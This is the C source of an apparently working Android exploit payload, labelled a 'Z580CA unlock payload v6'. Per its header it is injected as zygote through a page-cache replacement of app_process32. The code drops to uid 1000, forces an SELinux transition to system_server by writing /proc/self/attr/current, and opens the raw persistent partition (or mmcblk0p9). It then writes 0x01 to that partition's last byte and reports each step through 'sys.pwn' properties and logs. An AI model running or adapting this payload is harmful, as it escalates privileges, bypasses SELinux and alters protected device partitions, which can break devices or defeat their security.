/* Z580CA unlock payload v6, recovered from the 2026-10-15 transcript.
 * Runs through the page-cache replacement of app_process32 as zygote.
 * The child sets gid/uid 1000 before switching to system_server, then opens
 * the persistent partition and writes its last byte to 1 if needed.
 * Diagnostic results are reported through properties and the parent pipe.
 * The archived v6 run read already1; it did not establish which run set it.
 * Freestanding i386; build command and binary hash: docs/artifacts.md.
 */

#define SYS_exit 1
#define SYS_fork 2
#define SYS_read 3
#define SYS_write 4
#define SYS_open 5
#define SYS_close 6
#define SYS_wait4 7
#define SYS_setuid 23
#define SYS_setgid 47
#define SYS_lseek 19
#define SYS_fsync 118
#define SYS_pipe 42
#define SYS_nanosleep 162
#define SYS_socketcall 102
#define SYS_getxattr 229

#define SC_SOCKET   1
#define SC_CONNECT  3
#define SC_SENDTO   9
#define MSG_NOSIGNAL 0x4000

#define O_RDONLY 0
#define O_WRONLY 1
#define O_RDWR 2
#define O_CREAT 0x40
#define O_APPEND 0x400
#define O_TRUNC 0x200

#define SEEK_SET 0
#define SEEK_END 2

static inline long s(long n, long a, long b, long c, long d)
{
    long r;
    __asm__ volatile ("int $0x80" : "=a"(r) : "a"(n), "b"(a), "c"(b), "d"(c)
                      : "memory", "cc");
    return r;
}

static long slen(const char *p) { long n = 0; while (p[n]) n++; return n; }

static void putS(long v, char **pp)
{
    char *p = *pp;
    unsigned long u;
    char t[20];
    long i = 0;
    if (v < 0) { *p++ = '-'; u = (unsigned long)(-v); } else u = (unsigned long)v;
    if (u == 0) t[i++] = '0';
    while (u) { t[i++] = (char)('0' + (int)(u % 10)); u /= 10; }
    while (i) *p++ = t[--i];
    *pp = p;
}

static void putStr(const char *c, char **pp, long lim)
{
    long n = 0;
    char *p = *pp;
    while (c[n] && n < lim) { *p++ = c[n]; n++; }
    *pp = p;
}

static void putHexB(unsigned char b, char **pp)
{
    static const char hx[] = "0123456789abcdef";
    char *p = *pp;
    *p++ = hx[(b >> 4) & 0xf];
    *p++ = hx[b & 0xf];
    *pp = p;
}

static const char P_STATE[] = "/data/dalvik-cache/x86/.pwnstate";
static const char P_STOP[]  = "/data/dalvik-cache/x86/.pwnstop";
static const char P_LOG[]   = "/data/anr/pwn.log";
static const char P_PERSIST[] = "/dev/block/by-name/persistent";
static const char P_DIRECT[]  = "/dev/block/mmcblk0p9";
static const char A_SYS_SVR[] = "u:r:system_server:s0";   /* 20 chars */
static const char P_COMM[] = "/proc/self/comm";
static const char PSOCK[] = "/dev/socket/property_service";

struct ts { long sec; long nsec; };

static void park(void)
{
    struct ts t; t.sec = 30; t.nsec = 0;
    for (;;) { s(SYS_nanosleep, (long)&t, 0, 0, 0); }
}

static void stamp_comm(const char *c)
{
    long fd = s(SYS_open, (long)P_COMM, O_WRONLY, 0, 0);
    if (fd >= 0) {
        s(SYS_write, fd, (long)c, slen(c), 0);
        s(SYS_close, fd, 0, 0, 0);
    }
}

static void state_append(const char *buf, long n)
{
    long fd = s(SYS_open, (long)P_STATE, O_WRONLY | O_CREAT | O_APPEND, 0644, 0);
    if (fd >= 0) {
        s(SYS_write, fd, (long)buf, n, 0);
        s(SYS_close, fd, 0, 0, 0);
    }
}

/* ---- property socket (shared with restart_zygote.c) ---- */

static void setprop(const char *name, const char *val)
{
    long args[6];
    long fd;
    struct { short fam; char path[108]; } addr;
    char m[128];
    long i;

    for (i = 0; i < (long)sizeof(addr); i++) ((char *)&addr)[i] = 0;
    addr.fam = 1; /* AF_UNIX */
    for (i = 0; PSOCK[i]; i++) addr.path[i] = PSOCK[i];

    args[0] = 1; args[1] = 1; args[2] = 0;
    if ((fd = s(SYS_socketcall, SC_SOCKET, (long)args, 0, 0)) < 0) return;

    args[0] = fd; args[1] = (long)&addr; args[2] = 2 + slen(PSOCK) + 1;
    if (s(SYS_socketcall, SC_CONNECT, (long)args, 0, 0) < 0) {
        s(SYS_close, fd, 0, 0, 0);
        return;
    }

    for (i = 0; i < 128; i++) m[i] = 0;
    m[0] = 1;
    for (i = 0; name[i] && i < 31; i++) m[4 + i] = name[i];
    for (i = 0; val[i] && i < 91; i++) m[36 + i] = val[i];

    args[0] = fd; args[1] = (long)m; args[2] = 128; args[3] = MSG_NOSIGNAL;
    args[4] = 0; args[5] = 0;
    s(SYS_socketcall, SC_SENDTO, (long)args, 0, 0);

    s(SYS_close, fd, 0, 0, 0);
}

static void step(long pfd, char c)
{
    char n2[2];
    n2[0] = c; n2[1] = 0;
    s(SYS_write, pfd, (long)&c, 1, 0);
    setprop("sys.pwn.step", n2);
}

/* substring hit test (freestanding): is needle[0..nl) present in hay[0..hn)? */
static long shay(const unsigned char *hay, long hn, const char *nd, long nl)
{
    long i, j, hit;
    for (i = 0; i + nl <= hn; i++) {
        hit = 1;
        for (j = 0; j < nl; j++) { if (hay[i + j] != (unsigned char)nd[j]) { hit = 0; break; } }
        if (hit) return 1;
    }
    return 0;
}

static void child_work(long pfd)
{
    long fd, fd2, pf, lh, rd, wr, afd, rcw = -1;
    char ob[1], b2[1], wb[1];
    char ok = 'x';
    char sb[200];
    char *sp = sb;
    char trimmed[92];
    long i, wfd;

    step(pfd, '0');

    /* v6: become uid/gid 1000 FIRST - as zygote, whose policy allows it
     * (allow zygote zygote:capability {setgid setuid ...}) - exactly how the
     * real zygote wires its system_server child (born uid 1000). Do it BEFORE
     * the dyntransition: setprocattr's dyntransition only changes the SID, so
     * after it the process is uid 1000 + u:r:system_server:s0 = identical
     * creds to the real framework. Doing setuid as system_server is denied
     * (dontaudit self:capability setuid) - v5 proved that (su=-1). */
    { long sg, su;
      sg = s(SYS_setgid, 1000, 0, 0, 0);
      su = s(SYS_setuid, 1000, 0, 0, 0);
      putStr(" sg=", &sp, 5);
      putS(sg, &sp);
      putStr(" su=", &sp, 5);
      putS(su, &sp);
    }

    /* become system_server exactly like libselinux setcon(): O_RDWR+strlen+1 */
    afd = s(SYS_open, (long)"/proc/self/attr/current", O_RDWR, 0, 0);
    if (afd < 0) afd = s(SYS_open, (long)"/proc/self/attr/current", O_WRONLY, 0, 0);
    if (afd >= 0) {
        rcw = s(SYS_write, afd, (long)A_SYS_SVR, slen(A_SYS_SVR) + 1, 0);
        s(SYS_close, afd, 0, 0, 0);
    }
    step(pfd, 'a');
    if (rcw >= 0) step(pfd, 'A');

    fd = s(SYS_open, (long)P_LOG, O_WRONLY | O_CREAT | O_APPEND, 0666, 0);
    step(pfd, 'l');

    putStr("sc=", &sp, 4);
    putS(rcw, &sp);
    putStr(" lg=", &sp, 5);
    putS(fd, &sp);

    fd2 = s(SYS_open, (long)P_PERSIST, O_RDWR, 0, 0);
    step(pfd, 'f');
    putStr(" fr=", &sp, 5);
    putS(fd2, &sp);

    pf = s(SYS_open, (long)P_DIRECT, O_RDWR, 0, 0);
    step(pfd, 'F');
    putStr(" pf=", &sp, 5);
    putS(pf, &sp);

    /* write 0x01 to the last byte via whichever fd opened; read back */
    wfd = fd2 >= 0 ? fd2 : pf;
    if (wfd >= 0) {
        lh = s(SYS_lseek, wfd, (long)-1, SEEK_END, 0);
        rd = -1;
        if (lh >= 0) rd = s(SYS_read, wfd, (long)ob, 1, 0);
        putStr(" b=", &sp, 4);
        putS(rd, &sp);
        putStr("=0x", &sp, 4);
        if (rd == 1) putHexB((unsigned char)ob[0], &sp);
        step(pfd, 'k');

        if (rd == 1 && (unsigned char)ob[0] != 0x01) {
            wb[0] = 0x01;
            s(SYS_lseek, wfd, (long)-1, SEEK_END, 0);
            wr = s(SYS_write, wfd, (long)wb, 1, 0);
            putStr(" w=", &sp, 4);
            putS(wr, &sp);
            s(SYS_fsync, wfd, 0, 0, 0);
        } else if (rd == 1) {
            putStr(" already1", &sp, 10);
        }
        step(pfd, 'w');

        s(SYS_lseek, wfd, (long)-1, SEEK_END, 0);
        rd = -1;
        if (lh >= 0) rd = s(SYS_read, wfd, (long)b2, 1, 0);
        putStr(" rb=", &sp, 5);
        putS(rd, &sp);
        putStr("=0x", &sp, 4);
        if (rd == 1) putHexB((unsigned char)b2[0], &sp);
        if (rd == 1 && (unsigned char)b2[0] == 0x01) ok = 'o';

        s(SYS_close, wfd, 0, 0, 0);
        if (wfd != fd2 && fd2 >= 0) s(SYS_close, fd2, 0, 0, 0);
        if (wfd != pf && pf >= 0) s(SYS_close, pf, 0, 0, 0);
    } else {
        /* both opens failed: record only; the state text carries the rcs */
    }
    step(pfd, 'r');

    if (fd >= 0) {
        s(SYS_write, fd, (long)sb, (long)(sp - sb), 0);
        s(SYS_write, fd, (long)"\n", 1, 0);
        s(SYS_close, fd, 0, 0, 0);
    }

    { char c2[2]; c2[0] = ok; c2[1] = 0; setprop("sys.pwn.rc", c2); }
    for (i = 0; i < 91 && i < (long)(sp - sb); i++) trimmed[i] = sb[i];
    trimmed[i] = 0;
    setprop("sys.pwn.state", trimmed);

    s(SYS_write, pfd, (long)&ok, 1, 0);
    s(SYS_write, pfd, (long)sb, (long)(sp - sb), 0);
    s(SYS_close, pfd, 0, 0, 0);
}

static long isprog(char c)
{
    return (c == '0' || c == 'a' || c == 'A' || c == 's' || c == 'l' || c == 'f' ||
            c == 'F' || c == 'k' || c == 'w' || c == 'r');
}

void payload_main(void)
{
    long fds[2], pid, n, tot, marker, st = -1, lasti;
    char buf[256];
    char code = '-';
    char laststep = '-';
    char sv2[12];
    char *sp2;
    struct ts t;

    marker = s(SYS_open, (long)P_STOP, O_RDONLY, 0, 0);
    if (marker >= 0) {
        s(SYS_close, marker, 0, 0, 0);
        stamp_comm("pwn-parked");
        setprop("sys.pwn.park", "1");
        park();
    }

    s(SYS_pipe, (long)fds, 0, 0, 0);
    pid = s(SYS_fork, 0, 0, 0, 0);

    if (pid == 0) {
        s(SYS_close, fds[0], 0, 0, 0);
        child_work(fds[1]);
        s(SYS_exit, 0, 0, 0, 0);
    }

    s(SYS_close, fds[1], 0, 0, 0);
    tot = 0;
    for (;;) {
        if (tot >= (long)sizeof(buf) - 1) break;
        n = s(SYS_read, fds[0], (long)(buf + tot), (long)sizeof(buf) - 1 - tot, 0);
        if (n <= 0) break;
        tot += n;
    }
    s(SYS_close, fds[0], 0, 0, 0);

    s(SYS_wait4, pid, (long)&st, 0, 0);

    lasti = -1;
    if (tot >= 1) {
        long i;
        for (i = 0; i < tot; i++) if (isprog(buf[i])) lasti = i;
        if (lasti >= 0) laststep = buf[lasti];
        if (lasti + 1 < tot &&
            (buf[lasti + 1] == 'o' || buf[lasti + 1] == 'x')) code = buf[lasti + 1];
    }

    { char sv[2]; sv[0] = laststep; sv[1] = 0; setprop("sys.pwn.step", sv); }
    { char sv[2]; sv[0] = code; sv[1] = 0; setprop("sys.pwn.rc", sv); }

    sp2 = sv2;
    if (st == -1) { putStr("nx", &sp2, 3); }
    else if ((st & 0x7f) != 0) { putStr("S", &sp2, 2); putS(st & 0x7f, &sp2); }
    else { putStr("E", &sp2, 2); putS((st >> 8) & 0xff, &sp2); }
    *sp2 = 0;
    { long m = (long)(sp2 - sv2);
      setprop("sys.pwn.stat", sv2);
      state_append("stat=", 5); state_append(sv2, m); state_append(" ", 1); }

    if (code == 'o') {
        long md = s(SYS_open, (long)P_STOP, O_WRONLY | O_CREAT | O_TRUNC, 0644, 0);
        if (md >= 0) s(SYS_close, md, 0, 0, 0);
        stamp_comm("pwn-ok");
        setprop("sys.pwn.park", "1");
        state_append("ok:1\n", 5);
    } else if (code == 'x') {
        stamp_comm("pwn-x");
        state_append("fail:code-x\n", 12);
    } else {
        { char c2[8]; c2[0] = 'p'; c2[1] = 'w'; c2[2] = 'n'; c2[3] = '-';
          c2[4] = 'd'; c2[5] = (laststep == '-') ? '0' : laststep; c2[6] = 0;
          stamp_comm(c2);
          state_append("no-report step=", 15);
          state_append(c2 + 5, 1);
          state_append("\n", 1);
        }
    }
    if (tot > 0) state_append(buf, tot);
    state_append("\n", 1);

    t.sec = 4; t.nsec = 0;
    s(SYS_nanosleep, (long)&t, 0, 0, 0);
    s(SYS_exit, 0, 0, 0, 0);
}

asm(
".globl _start\n"
"_start:\n"
"  push $0\n"
"  call payload_main\n"
"  mov %eax, %ebx\n"
"  mov $1, %eax\n"
"  int $0x80\n"
"  hlt\n"
);
